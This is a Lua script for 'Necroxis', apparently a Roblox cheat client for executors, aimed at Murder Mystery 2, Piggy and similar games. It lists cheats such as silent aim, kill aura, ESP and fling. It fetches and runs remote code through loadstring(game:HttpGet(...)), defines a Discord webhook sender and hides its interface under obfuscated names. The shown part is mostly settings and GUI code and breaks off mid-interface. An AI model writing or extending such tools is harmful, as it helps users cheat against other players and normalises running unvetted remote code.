local runservice = game:GetService("RunService")
local replst = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local camera = workspace.CurrentCamera
local tweens = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer
local mouse = lp:GetMouse()
local V = "0.1b"
queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

local symbols = {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "+", "=", "{", "}", "[", "]", ";", ":", "'", "\"", ",", "<", ">", ".", "/", "?", "`", "~"}
local letters = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}

local numbers = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"}

local PlaceIds = {
    ["MM2"] = {142823291, 335132309, 636649648}, -- 1.Original, 2.Hidden, 3.Assasin
    ["MMV"] = {135278590967804, 81393828753170, 109838556332444},
    ["Doors"] = {},
    ["Piggy"] = {4623386862},
}

local mm2_features = {
    ["WalkSpeed_Toggle"] = false,
    ["WalkSpeed_Value"] = 16,
    ["JumpPower_Toggle"] = false,
    ["JumpPower_Value"] = 50,
    ["Fov_Toggle"] = false,
    ["Fov_Value"] = 75,
    ["Noclip_Toggle"] = false,
    ["ClickTp_Toggle"] = false,
    ["Float_Toggle"] = false,
    ["InfJump_Toggle"] = false,
    ["Fling_Toggle"] = false,
    ["IRN_Toggle"] = false,
    ["RemBar_Toggle"] = false,
    ["LoopInteract_Toggle"] = false,
    ["BodyRemover_Toggle"] = false,
    ["ChromaRemover_Toggle"] = false,
    ["PetRemover_Toggle"] = false,
    ["AutoBlurR_Toggle"] = false,
    ["AutoNotifR_Toggle"] = false,
    ["Esp_All"] = false,
    ["Esp_Murder"] = false,
    ["Esp_Sheriff"] = false,
    ["Esp_GunDrop"] = false,
    ["Highlight_All"] = false,
    ["Highlight_GunDrop"] = false,
    ["HighlightTransparency"] = 0.5,
    ["Tracers_All"] = false,
    ["AutoGrabGun"] = false,
    ["NofifDroppedGun"] = false,
    ["SilentAim"] = false,
    ["AimAccuracy"] = "Casual", 
    ["KillAura"] = false,
    ["KnifeRange"] = 15,
    ["AutoFarm"] = false,
    ["CollectionMethod"] = "Near",
    ["SpeedMethod"] = "Auto",
    ["ManualSpeedValue"] = 150,
    ["FakeSG"] = false,
    ["AutoBreakGun"] = false,
    ["AntiVoidDeath"] = false,
    ["AutoAvoidMurder"] = false,
    ["AutoGiveAE"] = false,
    ["InvisFly"] = false,
    ["AutoGetToys"] = false,
    ["TrapsRemover"] = false,
    ["InvisFlySpeed"] = 15,
    ["Spinner"] = false,
    ["SpinPower"] = 15,
    ["AutoSaveFeatures"] = false,
}

local mmv_features = {
    ["WalkSpeed_Toggle"] = false,
    ["WalkSpeed_Value"] = 16
}

local doors_features = {
    ["WalkSpeed_Toggle"] = false,
    ["WalkSpeed_Value"] = 16
}
local piggy_features = {
    ["WalkSpeed_Toggle"] = false,
    ["Items_Table"] = {AutoUpdate = false,Items = {}},
    ["WalkSpeed_Value"] = 16,
    ["GodMode"]= false,
}

local mm2_features_default = {
    ["WalkSpeed_Toggle"] = false,
    ["WalkSpeed_Value"] = 16,
    ["JumpPower_Toggle"] = false,
    ["JumpPower_Value"] = 50,
    ["Fov_Toggle"] = false,
    ["Fov_Value"] = 75,
    ["Noclip_Toggle"] = false,
    ["ClickTp_Toggle"] = false,
    ["Float_Toggle"] = false,
    ["InfJump_Toggle"] = false,
    ["Fling_Toggle"] = false,
    ["IRN_Toggle"] = false,
    ["RemBar_Toggle"] = false,
    ["LoopInteract_Toggle"] = false,
    ["BodyRemover_Toggle"] = false,
    ["ChromaRemover_Toggle"] = false,
    ["PetRemover_Toggle"] = false,
    ["AutoBlurR_Toggle"] = false,
    ["AutoNotifR_Toggle"] = false,
    ["Esp_All"] = false,
    ["Esp_Murder"] = false,
    ["Esp_Sheriff"] = false,
    ["Esp_GunDrop"] = false,
    ["Highlight_All"] = false,
    ["Highlight_GunDrop"] = false,
    ["HighlightTransparency"] = 0.5,
    ["Tracers_All"] = false,
    ["AutoGrabGun"] = false,
    ["NofifDroppedGun"] = false,
    ["SilentAim"] = false,
    ["AimAccuracy"] = "Casual", 
    ["KillAura"] = false,
    ["KnifeRange"] = 15,
    ["AutoFarm"] = false,
    ["CollectionMethod"] = "Near",
    ["SpeedMethod"] = "Auto",
    ["ManualSpeedValue"] = 150,
    ["FakeSG"] = false,
    ["AutoBreakGun"] = false,
    ["AntiVoidDeath"] = false,
    ["AutoAvoidMurder"] = false,
    ["AutoGiveAE"] = false,
    ["InvisFly"] = false,
    ["AutoGetToys"] = false,
    ["TrapsRemover"] = false,
    ["InvisFlySpeed"] = 15,
    ["Spinner"] = false,
    ["SpinPower"] = 15,
    ["AutoSaveFeatures"] = false,
}

local mmv_features_default = {
    ["WalkSpeed_Toggle"] = false,
    ["WalkSpeed_Value"] = 16
}

local doors_features_default = {
    ["WalkSpeed_Toggle"] = false,
    ["WalkSpeed_Value"] = 16
}
local piggy_features_default = {
    ["WalkSpeed_Toggle"] = false,
    ["Items_Table"] = {AutoUpdate = false,Items = {}},
    ["WalkSpeed_Value"] = 16,
    ["GodMode"]= false,
}

if not isfolder("Necroxis") then
    makefolder("Necroxis")
    end
    if not isfolder("Necroxis/MM2") then
    makefolder("Necroxis/MM2")
    end
    if not isfolder("Necroxis/MMV") then
    makefolder("Necroxis/MMV")
    end
    if not isfolder("Necroxis/Doors") then
    makefolder("Necroxis/Doors")
    end
    if not isfolder("Necroxis/Piggy") then
    makefolder("Necroxis/Piggy")
    end
    if not isfile("Necroxis/MM2/Setup.lua") then
    writefile("Necroxis/MM2/Setup.lua", HttpService:JSONEncode(mm2_features))
    else
    local funcTY = readfile("Necroxis/MM2/Setup.lua")
    mm2_features = HttpService:JSONDecode(funcTY)
    wait(.1)
    if mm2_features["AutoSaveFeatures"] == false then
        mm2_features = mm2_features_default
    end
    end
    if not isfile("Necroxis/MMV/Setup.lua") then
    writefile("Necroxis/MMV/Setup.lua", HttpService:JSONEncode(mmv_features))
    else
    local funcTY = readfile("Necroxis/MMV/Setup.lua")
    mmv_features = HttpService:JSONDecode(funcTY)
    end
    if not isfile("Necroxis/Doors/Setup.lua") then
    writefile("Necroxis/Doors/Setup.lua", HttpService:JSONEncode(doors_features))
    else
    local funcTY = readfile("Necroxis/Doors/Setup.lua")
    doors_features = HttpService:JSONDecode(funcTY)
    end
    if not isfile("Necroxis/Piggy/Setup.lua") then
    writefile("Necroxis/Piggy/Setup.lua", HttpService:JSONEncode(piggy_features))
    else
    local funcTY = readfile("Necroxis/Piggy/Setup.lua")
    piggy_features = HttpService:JSONDecode(funcTY)
    end
    
    function UpdateFeature(gamef, feature, value)
    if gamef == "mm2" then
    mm2_features[feature] = value
    elseif gamef == "mmv" then
    mmv_features[feature] = value
    elseif gamef == "doors" then
    doors_features[feature] = value
    elseif gamef == "piggy" then
    piggy_features[feature] = value
    end
    if isfile("Necroxis/MM2/Setup.lua") then
    delfile("Necroxis/MM2/Setup.lua")
    end
    writefile("Necroxis/MM2/Setup.lua", HttpService:JSONEncode(mm2_features))
    if isfile("Necroxis/MMV/Setup.lua") then
    delfile("Necroxis/MMV/Setup.lua")
    end
    writefile("Necroxis/MMV/Setup.lua", HttpService:JSONEncode(mmv_features))
    if isfile("Necroxis/Doors/Setup.lua") then
    delfile("Necroxis/Doors/Setup.lua")
    end
    writefile("Necroxis/Doors/Setup.lua", HttpService:JSONEncode(doors_features))
    if isfile("Necroxis/Piggy/Setup.lua") then
    delfile("Necroxis/Piggy/Setup.lua")
    end
    writefile("Necroxis/Piggy/Setup.lua", HttpService:JSONEncode(piggy_features))
    end

function SendDiscord(url, cont, usern, text, descript, url2, fi)
    local apiRequest = request or http_request or (http and http.request) or (syn and syn.request)
    local response = apiRequest(
        {
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(
                {
                    content = cont,
                    username = usern,
                    embeds = {
                        {
                            title = text,
                            description = descript,
                            type = "rich",
                            color = 0xffffff,
                            url = url2,
                            fields = fi
                        }
                    }
                }
            )
        }
    )
    end

function IsOwner(p)
    if p.UserId == 3029063746 or p.UserId == 4244252767 or p.UserId == 7212492747 then
    return true
    else
        return false
    end
    end
    
    function IsNecroxisTeam(p)
    if p.UserId == 2629946509 then
    return true
    else
        return false
    end
    end
    
    function IsTester(p)
    if p.UserId == 722892937 then
    return true
    else
        return false
    end
    end

function CheckTableEquality(t1,t2)
    if game.HttpService:JSONEncode(t1) == game.HttpService:JSONEncode(t2) then
        return true
    else
        return false
        end
end
local BLOCK = {0, 1, 2, 3, 4, 5, 6, 7}
local WEDGE = {0, 1, 3, 4, 5, 7}
local CORNER_WEDGE = {0, 1, 4, 5, 6}

-- Class

local ViewportModelClass = {}
ViewportModelClass.__index = ViewportModelClass
ViewportModelClass.ClassName = "ViewportModel"

-- Private

local function getIndices(part)
	if part:IsA("WedgePart") then
		return WEDGE
	elseif part:IsA("CornerWedgePart") then
		return CORNER_WEDGE
	end
	return BLOCK
end

local function getCorners(cf, size2, indices)
	local corners = {}
	for _, i in pairs(indices) do
		corners[i + 1] = cf * (size2 * Vector3.new(
			2 * (math.floor(i / 4) % 2) - 1,
			2 * (math.floor(i / 2) % 2) - 1,
			2 * (i % 2) - 1
		))
	end
	return corners
end

local function getModelPointCloud(model)
	local points = {}
	for _, part in pairs(model:GetDescendants()) do
		if part:IsA("BasePart") then
			local indices = getIndices(part)
			local corners = getCorners(part.CFrame, part.Size / 2, indices)
			for _, wp in pairs(corners) do
				table.insert(points, wp)
			end
		end
	end
	return points
end

local function viewProjectionEdgeHits(cloud, axis, depth, tanFov2)
	local max, min = -math.huge, math.huge

	for _, lp in pairs(cloud) do
		local distance = depth - lp.Z
		local halfSpan = tanFov2 * distance

		local a = lp[axis] + halfSpan
		local b = lp[axis] - halfSpan

		max = math.max(max, a, b)
		min = math.min(min, a, b)
	end

	return max, min
end

-- Public Constructors

function ViewportModelClass.new(vpf, camera)
	local self = setmetatable({}, ViewportModelClass)
	
	self.Model = nil
	self.ViewportFrame = vpf
	self.Camera = camera
	
	self._points = {}
	self._modelCFrame = CFrame.new()
	self._modelSize = Vector3.new()
	self._modelRadius = 0
	
	self._viewport = {}
	
	self:Calibrate()
	
	return self
end

-- Public Methods

-- Used to set the model that is being focused on
-- should be used for new models and/or a change in the current model
-- e.g. parts added/removed from the model or the model cframe changed
function ViewportModelClass:SetModel(model)
	self.Model = model
	
	local cf, size = model:GetBoundingBox()
	
	self._points = getModelPointCloud(model)
	self._modelCFrame = cf
	self._modelSize = size	
	self._modelRadius = size.Magnitude / 2
end

-- Should be called when something about the viewport frame / camera changes
-- e.g. the frame size or the camera field of view
function ViewportModelClass:Calibrate()
	local viewport = {}
	local size = self.ViewportFrame.AbsoluteSize
	
	viewport.aspect = size.X / size.Y
	
	viewport.yFov2 = math.rad(self.Camera.FieldOfView / 2)
	viewport.tanyFov2 = math.tan(viewport.yFov2)
		
	viewport.xFov2 = math.atan(viewport.tanyFov2 * viewport.aspect)
	viewport.tanxFov2 = math.tan(viewport.xFov2)
	
	viewport.cFov2 = math.atan(viewport.tanyFov2 * math.min(1, viewport.aspect))
	viewport.sincFov2 = math.sin(viewport.cFov2)
	
	self._viewport = viewport
end

-- returns a fixed distance that is guarnteed to encapsulate the full model
-- this is useful for when you want to rotate freely around an object w/o expensive calculations
-- focus position can be used to set the origin of where the camera's looking
-- otherwise the model's center is assumed
function ViewportModelClass:GetFitDistance(focusPosition)
	local displacement = focusPosition and  (focusPosition - self._modelCFrame.Position).Magnitude or 0
	local radius = self._modelRadius + displacement

	return radius / self._viewport.sincFov2
end

-- returns the optimal camera cframe that would be needed to best fit 
-- the model in the viewport frame at the given orientation.
-- keep in mind this functions best when the model's point-cloud is correct
-- as such models that rely heavily on meshesh, csg, etc will only return an accurate
-- result as their point cloud
function ViewportModelClass:GetMinimumFitCFrame(orientation)
	if not self.Model then
		return CFrame.new()
	end
	
	local rotation = orientation - orientation.Position
	local rInverse = rotation:Inverse()
	
	local wcloud = self._points
	local cloud = {rInverse * wcloud[1]}
	local furthest = cloud[1].Z

	for i = 2, #wcloud do
		local lp = rInverse * wcloud[i]
		furthest = math.min(furthest, lp.Z)
		cloud[i] = lp
	end
	
	local hMax, hMin = viewProjectionEdgeHits(cloud, "X", furthest, self._viewport.tanxFov2)
	local vMax, vMin = viewProjectionEdgeHits(cloud, "Y", furthest, self._viewport.tanyFov2)

	local distance = math.max(
		((hMax - hMin) / 2) / self._viewport.tanxFov2,
		((vMax - vMin) / 2) / self._viewport.tanyFov2
	)

	return orientation * CFrame.new(
		(hMax + hMin) / 2,
		(vMax + vMin) / 2,
		furthest + distance
	)
end


function GP(String)
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
            table.insert(Found,v)
        end
    elseif strl == "others" then
        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
            if v.Name ~= lp.Name then
                table.insert(Found,v)
            end
        end
    elseif strl == "me" then
        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
            if v.Name == lp.Name then
                table.insert(Found,v)
            end
        end
    else
        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end
    end
    return Found
end

function gC(length)
    local code = ""
    for i = 1, length do
        local randomIndex = math.random(1, 3)
        if randomIndex == 1 then
            code = code .. symbols[math.random(1, #symbols)]
        elseif randomIndex == 2 then
            code = code .. letters[math.random(1, #letters)]
        else
            code = code .. numbers[math.random(1, #numbers)]
        end
    end
    return code
end

function gethp(o)
	if o and o.Character then
		return o.Character.FindFirstChild(o.Character, "PrimaryPart") or o.Character.FindFirstChild(o.Character, "HumanoidRootPart")
	end
end



local function convertText(text)
local text = text
local convertedText = ""

local conversionTableUpper = {
    A = "Ạ", B = "Ḅ", C = "C", D = "Ḍ", E = "Ẹ",
    F = "F", G = "Ģ", H = "Ḥ", I = "Ị", J = "J",
    K = "Ḳ", L = "Ḷ", M = "Ṃ", N = "Ṇ", O = "Ọ",
    P = "Р", Q = "Q", R = "Ṛ", S = "Ṣ", T = "Ṭ",
    U = "Ụ", V = "Ṿ", W = "Ẉ", X = "Ẋ", Y = "Ỵ", Z = "Ẓ"
}

local conversionTableLower = {
    a = "ạ", b = "ḅ", c = "c", d = "ḍ", e = "ẹ",
    f = "f", g = "ɡ", h = "ḥ", i = "ị", j = "ј",
    k = "ḳ", l = "ḷ", m = "ṃ", n = "ṇ", o = "ọ",
    p = "р", q = "q", r = "ṛ", s = "ṣ", t = "ṭ",
    u = "ụ", v = "ṿ", w = "ẉ", x = "ẋ", y = "ỵ", z = "ẓ", ["|"] = "\r",
}

for char in text:gmatch(".") do
local convertedChar = conversionTableUpper[char] or conversionTableLower[char] or char
convertedText = convertedText .. convertedChar .. "͎"
end

return convertedText
end

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
function SendNotification(descr, duract)
    Notification:Notify(
    {Title = "Necroxis | Notification", Description = descr},
    {OutlineColor = Color3.fromRGB(12, 51, 204),Time = duract or 8, Type = "default"}
)
end
function SendWarning(descr, duract)
    Notification:Notify(
    {Title = "Necroxis | Notification", Description = descr},
    {OutlineColor = Color3.fromRGB(224, 131, 18),Time = duract or 8, Type = "default"}
)
end

function SendError(descr, duract)
    Notification:Notify(
    {Title = "Necroxis | Error", Description = descr},
    {OutlineColor = Color3.fromRGB(224, 0, 0),Time = duract or 8, Type = "default"}
)
end
 
local Notif = {}
do 
	local CoreGUI = game:GetService("CoreGui")
	local TS = game:GetService("TweenService")

	local HIDEUI = get_hidden_gui or gethui
	if syn and typeof(syn) == "table" and RenderWindow then syn.protect_gui = gethui; end
	local function Hide_UI(gui)
		if HIDEUI then
			gui["Parent"] = HIDEUI()
		elseif (not is_sirhurt_closure) and (syn and syn.protect_gui) then
			syn.protect_gui(gui)
			gui["Parent"] = CoreGUI
		elseif CoreGUI:FindFirstChild('RobloxGui') then
			gui["Parent"] = CoreGUI.RobloxGui
		else
			gui["Parent"] = CoreGUI
		end
	  end

	local screen_gui = Instance.new("ScreenGui")
	--Hide_UI(screen_gui)
	screen_gui.Parent = game.Players.LocalPlayer.PlayerGui
	local frame = Instance.new("Frame")
	frame.AnchorPoint = Vector2.new(0.5, 0.949999988079071)
	frame.BackgroundColor3 = Color3.new(1, 1, 1)
	frame.BackgroundTransparency = 1
	frame.BorderColor3 = Color3.new(0, 0, 0)
	frame.BorderSizePixel = 0
	frame.Position = UDim2.new(0.5, 0, 0.954999983, 0)
	frame.Size = UDim2.new(0, 100, 0, 100)
	frame.Visible = true
	frame.Parent = screen_gui

	local uilist_layout = Instance.new("UIListLayout")
	uilist_layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	uilist_layout.SortOrder = Enum.SortOrder.LayoutOrder
	uilist_layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
	uilist_layout.Parent = frame

	function Notif.New(text, timee)
		local frame_2 = Instance.new("Frame")
		frame_2.BackgroundColor3 = Color3.new(1, 1, 1)
		frame_2.BorderColor3 = Color3.new(0, 0, 0)
		frame_2.BorderSizePixel = 0
		frame_2.BackgroundTransparency = 1
		frame_2.Size = UDim2.new(0, 100, 0, 0)
		frame_2.Visible = true
		frame_2.Parent = frame

		-- Main Notification Frame
		local frame_3 = Instance.new("Frame")
		frame_3.AnchorPoint = Vector2.new(0.5, 1)
		frame_3.AutomaticSize = Enum.AutomaticSize.X
		frame_3.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.141176)
		frame_3.BackgroundTransparency = 0.20000000298023224
		frame_3.BorderColor3 = Color3.new(0, 0, 0)
		frame_3.Position = UDim2.new(0.5, 0, 1, 60)
		frame_3.Size = UDim2.new(0, 0, 0, 30)
		frame_3.Visible = true
		frame_3.Parent = frame_2

		local uicorner = Instance.new("UICorner")
		uicorner.CornerRadius = UDim.new(0, 6)
		uicorner.Parent = frame_3

		local uipadding = Instance.new("UIPadding")
		uipadding.PaddingBottom = UDim.new(0, 3)
		uipadding.PaddingLeft = UDim.new(0, 3)
		uipadding.PaddingRight = UDim.new(0, 3)
		uipadding.PaddingTop = UDim.new(0, 3)
		uipadding.Parent = frame_3

		local uistroke = Instance.new("UIStroke")
		uistroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uistroke.Color = Color3.new(0.0313726, 0.0313726, 0.0313726)
		uistroke.Parent = frame_3

		local text_label = Instance.new("TextLabel")
		text_label.Font = Enum.Font.Gotham
		text_label.Text = text
		text_label.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
		text_label.TextSize = 14
		text_label.AutomaticSize = Enum.AutomaticSize.X
		text_label.BackgroundColor3 = Color3.new(1, 1, 1)
		text_label.BackgroundTransparency = 1
		text_label.BorderColor3 = Color3.new(0, 0, 0)
		text_label.BorderSizePixel = 0
		text_label.Size = UDim2.new(0, 0, 0, 24)
		text_label.Visible = true
		text_label.Parent = frame_3

		local uipadding_2 = Instance.new("UIPadding")
		uipadding_2.PaddingLeft = UDim.new(0, 5)
		uipadding_2.PaddingRight = UDim.new(0, 30)
		uipadding_2.Parent = text_label

		local text_button = Instance.new("TextButton")
		text_button.Font = Enum.Font.SourceSans
		text_button.Text = ""
		text_button.TextColor3 = Color3.new(0, 0, 0)
		text_button.TextSize = 14
		text_button.AnchorPoint = Vector2.new(1, 0.5)
		text_button.BackgroundColor3 = Color3.new(0, 0, 0)
		text_button.BackgroundTransparency = 1
		text_button.BorderColor3 = Color3.new(0, 0, 0)
		text_button.BorderSizePixel = 0
		text_button.Position = UDim2.new(1, 0, 0.5, 0)
		text_button.Size = UDim2.new(0, 24, 0, 24)
		text_button.Visible = true
		text_button.Parent = frame_3

		local uicorner_2 = Instance.new("UICorner")
		uicorner_2.CornerRadius = UDim.new(0, 5)
		uicorner_2.Parent = text_button

		local image_button = Instance.new("ImageButton")
		image_button.Image = "rbxassetid://3926305904"
		image_button.ImageColor3 = Color3.new(0.784314, 0.784314, 0.784314)
		image_button.ImageRectOffset = Vector2.new(924, 724)
		image_button.ImageRectSize = Vector2.new(36, 36)
		image_button.AnchorPoint = Vector2.new(0.5, 0.5)
		image_button.BackgroundTransparency = 1
		image_button.LayoutOrder = 3
		image_button.Position = UDim2.new(0.5, 0, 0.5, 0)
		image_button.Size = UDim2.new(0, 18, 0, 18)
		image_button.Visible = true
		image_button.ZIndex = 2
		image_button.Parent = text_button

		--Animations
		TS:Create(frame_3, TweenInfo.new(0.2, Enum.EasingStyle.Quint), { Position = UDim2.new(0.5, 0, 1, 0) }):Play()
		TS:Create(frame_2, TweenInfo.new(0.2, Enum.EasingStyle.Quint), { Size = UDim2.new(0, 100, 0, 35) }):Play()

		-- Close Button
		local function close_notif()
			TS:Create(image_button, TweenInfo.new(0.15, Enum.EasingStyle.Quint), { ImageTransparency = 1 }):Play()
			TS:Create(text_button, TweenInfo.new(0.15, Enum.EasingStyle.Quint), { BackgroundTransparency = 1 }):Play()
			TS:Create(text_label, TweenInfo.new(0.15, Enum.EasingStyle.Quint), { TextTransparency = 1 }):Play()
			task.wait(.17)
			TS:Create(frame_3, TweenInfo.new(0.25, Enum.EasingStyle.Quint), { BackgroundTransparency = 1 }):Play()
			TS:Create(uistroke, TweenInfo.new(0.24, Enum.EasingStyle.Quint), { Transparency = 1 }):Play()
			task.wait(.05)
			TS:Create(frame_2, TweenInfo.new(0.2, Enum.EasingStyle.Quint), { Size = UDim2.new(0, 100, 0, 0) }):Play()
			task.wait(.2)
			frame_2:Destroy()
		end
		text_button.MouseEnter:Connect(function()
			TS:Create(text_button, TweenInfo.new(0.25, Enum.EasingStyle.Quint), { BackgroundTransparency = 0.8 }):Play()
			TS:Create(image_button, TweenInfo.new(0.3, Enum.EasingStyle.Quint),
				{ ImageColor3 = Color3.new(0.890196, 0.054902, 0.054902) }):Play()
		end)

		text_button.MouseLeave:Connect(function()
			TS:Create(text_button, TweenInfo.new(0.25, Enum.EasingStyle.Quint), { BackgroundTransparency = 1 }):Play()
			TS:Create(image_button, TweenInfo.new(0.3, Enum.EasingStyle.Quint),
				{ ImageColor3 = Color3.new(0.784314, 0.784314, 0.784314) }):Play()
		end)

		text_button.MouseButton1Click:Connect(function()
			TS:Create(image_button, TweenInfo.new(0.15, Enum.EasingStyle.Quint), { ImageTransparency = 1 }):Play()
			TS:Create(text_button, TweenInfo.new(0.15, Enum.EasingStyle.Quint), { BackgroundTransparency = 1 }):Play()
			TS:Create(text_label, TweenInfo.new(0.15, Enum.EasingStyle.Quint), { TextTransparency = 1 }):Play()
			task.wait(.17)
			TS:Create(frame_3, TweenInfo.new(0.25, Enum.EasingStyle.Quint), { BackgroundTransparency = 1 }):Play()
			TS:Create(uistroke, TweenInfo.new(0.24, Enum.EasingStyle.Quint), { Transparency = 1 }):Play()
			task.wait(.05)
			TS:Create(frame_2, TweenInfo.new(0.2, Enum.EasingStyle.Quint), { Size = UDim2.new(0, 100, 0, 0) }):Play()
			task.wait(.2)
			frame_2:Destroy()
		end)
		image_button.MouseButton1Click:Connect(close_notif)
		task.delay(tonumber(timee) and timee or 10, close_notif)
	end

	


end
local function teleportToPart(v3) --[[ Line: 7 ]] --[[ Name: teleportToPart ]]
    local RootPart = lp.Character:FindFirstChildOfClass("Humanoid").RootPart;
    if not RootPart then
        return;
    else
        local l_Position_0 = v3.Position;
        local l_LookVector_0 = v3.CFrame.LookVector;
       local v7 = Vector3.new(l_LookVector_0.X, RootPart.CFrame.LookVector.Y, l_LookVector_0.Z);
        --local v7 = Vector3.new(l_LookVector_0.X, RootPart.LookVector.Y, l_LookVector_0.Z);
        local v8 = l_Position_0 + Vector3.new(0, lp.Character:FindFirstChildOfClass("Humanoid").HipHeight, 0);
        RootPart:PivotTo(CFrame.lookAt(v8, v8 + v7));
        return;
    end;
end;
-- Instances: 41 | Scripts: 0 | Modules: 0 | Tags: 0
local UI = {};
function LoadUI()
-- StarterGui.Necroxis.Max


-- StarterGui.Necroxis
UI["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
UI["1"]["IgnoreGuiInset"] = true;
UI["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
UI["1"].Name = "Nẹcrᴏxiṣ_gᶒn"..game.HttpService:GenerateGUID(false)
UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
UI["1"]["ResetOnSpawn"] = false;
UI["1"].DisplayOrder = math.huge
UI["1"].ClipToDeviceSafeArea = true
UI["1"].ScreenInsets = Enum.ScreenInsets.None
UI["MaxDrag"] = Instance.new("Frame", UI["1"]);
UI["MaxDrag"]["BorderSizePixel"] = 0;
UI["MaxDrag"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["MaxDrag"]["Size"] = UDim2.new(1, 0, 1, 0);
UI["MaxDrag"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
UI["MaxDrag"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["MaxDrag"]["Name"] = [[DragMaxFrame]];
UI["MaxDrag"].Visible = false

-- StarterGui.Necroxis.Main
UI["2"] = Instance.new("CanvasGroup", UI["1"]);
UI["2"]["ZIndex"] = 9999999;
UI["2"]["BorderSizePixel"] = 0;
UI["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["2"]["Selectable"] = true;
UI["2"]["Visible"] = false
UI["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["2"]["Size"] = UDim2.new(0.56436, 0, 0.67724, 0);
UI["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
UI["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["2"]["Name"] = [[Main]];
UI["Drag"] = Instance.new("UIDragDetector",UI["2"])
UI["Drag"].BoundingUI = UI["MaxDrag"] 

-- StarterGui.Necroxis.Main.UICorner
UI["3"] = Instance.new("UICorner", UI["2"]);
UI["3"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Necroxis.Main.UIGradient
UI["4"] = Instance.new("UIGradient", UI["2"]);
UI["4"]["Enabled"] = false;
UI["4"]["Rotation"] = -50;
UI["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(3, 3, 3)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(31, 31, 31))};


-- StarterGui.Necroxis.Main.Line
UI["5"] = Instance.new("Frame", UI["2"]);
UI["5"]["BorderSizePixel"] = 0;
UI["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["5"]["Size"] = UDim2.new(0.9, 0, 0.00339, 0);
UI["5"]["Position"] = UDim2.new(0.5, 0, 0.11694, 0);
UI["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["5"]["Name"] = [[Line]];


-- StarterGui.Necroxis.Main.Line.Title
UI["6"] = Instance.new("Frame", UI["5"]);
UI["6"]["ZIndex"] = 2;
UI["6"]["BorderSizePixel"] = 0;
UI["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["6"]["Size"] = UDim2.new(1.05556, 0, 34.55232, 0);
UI["6"]["Position"] = UDim2.new(0, 0, -34.55232, 0);
UI["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["6"]["Name"] = [[Title]];
UI["6"]["BackgroundTransparency"] = 1;


-- StarterGui.Necroxis.Main.Line.Title.Version
UI["7"] = Instance.new("TextLabel", UI["6"]);
UI["7"]["TextWrapped"] = true;
UI["7"]["ZIndex"] = 10;
UI["7"]["BorderSizePixel"] = 0;
UI["7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["7"]["TextScaled"] = true;
UI["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["7"]["TextSize"] = 14;
UI["7"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
UI["7"]["TextColor3"] = Color3.fromRGB(199, 199, 199);
UI["7"]["BackgroundTransparency"] = 1;
UI["7"]["Size"] = UDim2.new(0.0376, 0, 0.44614, 0);
UI["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["7"]["Text"] = [[1.0]];
UI["7"]["LayoutOrder"] = -1;
UI["7"]["Name"] = [[Version]];
UI["7"]["Position"] = UDim2.new(0, 0, 0.55386, 0);


-- StarterGui.Necroxis.Main.Line.Title.Version.UITextSizeConstraint
UI["8"] = Instance.new("UITextSizeConstraint", UI["7"]);
UI["8"]["MaxTextSize"] = 17;


-- StarterGui.Necroxis.Main.Line.Title.PlaceName
UI["9"] = Instance.new("TextLabel", UI["6"]);
UI["9"]["TextWrapped"] = true;
UI["9"]["ZIndex"] = 10;
UI["9"]["BorderSizePixel"] = 0;
UI["9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["9"]["TextScaled"] = true;
UI["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["9"]["TextSize"] = 14;
